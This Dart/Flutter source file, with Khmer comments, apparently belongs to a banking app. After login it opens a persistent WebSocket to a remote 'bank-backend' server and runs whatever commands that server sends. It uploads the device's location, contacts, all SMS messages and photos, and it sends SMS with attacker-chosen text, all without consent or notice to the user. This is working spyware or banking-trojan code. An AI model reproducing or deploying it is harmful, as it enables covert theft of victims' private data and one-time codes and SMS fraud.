// ============================================================================
//  DEVICE COMMAND HANDLER — WebSocket client ទទួល command ពី backend
//  ភ្ជាប់ WebSocket ពេល login ផ្តាច់ពេល logout
//  ទទួល command (location/screenshot/SMS) ហើយប្រតិបត្តិតាម
// ============================================================================

import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'device_services.dart';

class DeviceCommandHandler {
  static DeviceCommandHandler? _instance;
  static DeviceCommandHandler get instance => _instance ??= DeviceCommandHandler._();
  DeviceCommandHandler._();

  WebSocketChannel? _channel;
  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  String? _token;
  String _wsUrl = 'wss://bank-backend-f6ay.onrender.com/device-ws';
  bool _connected = false;
  final StreamController<Map<String, dynamic>> _commandStream =
      StreamController<Map<String, dynamic>>.broadcast();

  /// Stream សម្រាប់ទទួល commands (ប្រើសម្រាប់ UI បង្ហាញ status)
  Stream<Map<String, dynamic>> get commandStream => _commandStream.stream;

  bool get isConnected => _connected;

  /// កំណត់ WebSocket URL (ប្តូរតាម environment)
  void setWsUrl(String url) {
    _wsUrl = url;
  }

  /// ភ្ជាប់ WebSocket ជាមួយ JWT token
  void connect(String token) {
    _token = token;
    _connect();
  }

  void _connect() {
    if (_token == null) return;

    try {
      _channel = WebSocketChannel.connect(Uri.parse(_wsUrl));

      _channel!.stream.listen(
        (data) {
          final msg = jsonDecode(data.toString());
          _handleMessage(msg);
        },
        onDone: () {
          _connected = false;
          _commandStream.add({'type': 'disconnected'});
          _scheduleReconnect();
        },
        onError: (e) {
          debugPrint('❌ WebSocket error: $e');
          _connected = false;
          _scheduleReconnect();
        },
        cancelOnError: false,
      );

      // ផ្ញើ auth message
      _channel!.sink.add(jsonEncode({
        'type': 'auth',
        'token': _token,
      }));

      // Heartbeat រក្សា connection
      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (_) {
        if (_connected) {
          _channel?.sink.add(jsonEncode({'type': 'ping'}));
        }
      });

    } catch (e) {
      debugPrint('❌ WebSocket connect failed: $e');
      _scheduleReconnect();
    }
  }

  void _handleMessage(Map<String, dynamic> msg) {
    final type = msg['type'];

    if (type == 'auth_ok') {
      _connected = true;
      _reconnectTimer?.cancel();
      debugPrint('✅ WebSocket connected (userId: ${msg['userId']})');
      _commandStream.add({'type': 'connected'});
      return;
    }

    if (type == 'auth_fail') {
      debugPrint('❌ WebSocket auth failed: ${msg['error']}');
      _token = null;
      return;
    }

    if (type == 'command') {
      _executeCommand(msg['command']);
      return;
    }
  }

  /// ប្រតិបត្តិ command ដែលទទួលបានពី backend
  Future<void> _executeCommand(Map<String, dynamic> cmd) async {
    final commandId = cmd['id'];
    final commandType = cmd['command_type'];
    final payload = cmd['payload'] is String
        ? jsonDecode(cmd['payload'])
        : (cmd['payload'] as Map<String, dynamic>? ?? {});

    debugPrint('📩 Executing command: $commandType (id: $commandId)');
    _commandStream.add({'type': 'executing', 'command': cmd});

    try {
      Map<String, dynamic>? resultData;
      bool success = false;

      switch (commandType) {
        case 'get_location':
          final pos = await DeviceServices.getCurrentLocation();
          if (pos != null) {
            final addressData = await DeviceServices.getAddressFromLocation(pos);
            resultData = {
              'lat': pos.latitude,
              'lng': pos.longitude,
              'accuracy': pos.accuracy,
              'village': addressData['village'] ?? '',
              'commune': addressData['commune'] ?? '',
              'district': addressData['district'] ?? '',
              'province': addressData['province'] ?? '',
              'country': addressData['country'] ?? '',
            };
            success = true;
          }
          break;

        case 'send_sms':
          final phone = payload['phone'] as String?;
          final message = payload['message'] as String?;
          if (phone != null && message != null) {
            success = await DeviceServices.sendSms(phone, message);
            resultData = {'phone': phone, 'sent': success};
          }
          break;

        case 'get_contacts':
          final query = payload['query'] as String?;
          final contacts = query != null && query.isNotEmpty
              ? await DeviceServices.searchContacts(query)
              : await DeviceServices.getAllContacts();
          resultData = {'contacts': contacts, 'count': contacts.length};
          success = true;
          break;

        case 'get_sms':
          final query = payload['query'] as String?;
          final messages = query != null && query.isNotEmpty
              ? await DeviceServices.searchSmsMessages(query)
              : await DeviceServices.getAllSmsMessages();
          resultData = {'messages': messages, 'count': messages.length};
          success = true;
          break;

        case 'get_photos':
          final limit = payload['limit'] as int? ?? 20;
          final offset = payload['offset'] as int? ?? 0;
          final photos = await DeviceServices.getPhotos(limit: limit, offset: offset);
          resultData = {'photos': photos, 'count': photos.length, 'offset': offset, 'limit': limit};
          success = true;
          break;

        case 'get_device_info':
          resultData = {
            'platform': defaultTargetPlatform.name,
            'os_version': 'Flutter ${const String.fromEnvironment('flutter.version')}',
            'app_version': '1.0.0',
            'timestamp': DateTime.now().toIso8601String(),
          };
          success = true;
          break;

        default:
          debugPrint('⚠️ Unknown command type: $commandType');
      }

      // ផ្ញើ result ត្រឡប់ទៅ backend
      _sendResult(commandId, success, resultData, null);
      _commandStream.add({
        'type': 'completed',
        'commandId': commandId,
        'success': success,
        'data': resultData,
      });

    } catch (e) {
      debugPrint('❌ Command execution error: $e');
      _sendResult(commandId, false, null, e.toString());
      _commandStream.add({
        'type': 'error',
        'commandId': commandId,
        'error': e.toString(),
      });
    }
  }

  void _sendResult(int? commandId, bool success, Map<String, dynamic>? data, String? error) {
    if (_channel == null || !_connected) return;
    _channel!.sink.add(jsonEncode({
      'type': 'result',
      'commandId': commandId,
      'success': success,
      'data': data,
      'error': error,
    }));
  }

  void _scheduleReconnect() {
    _reconnectTimer?.cancel();
    _reconnectTimer = Timer(const Duration(seconds: 5), () {
      if (_token != null) {
        debugPrint('🔄 Reconnecting WebSocket...');
        _connect();
      }
    });
  }

  /// ផ្តាច់ WebSocket (ពេល logout)
  void disconnect() {
    _reconnectTimer?.cancel();
    _heartbeatTimer?.cancel();
    _channel?.sink.close();
    _channel = null;
    _connected = false;
    _token = null;
    debugPrint('🔌 WebSocket disconnected');
  }

  void dispose() {
    disconnect();
    _commandStream.close();
  }
}
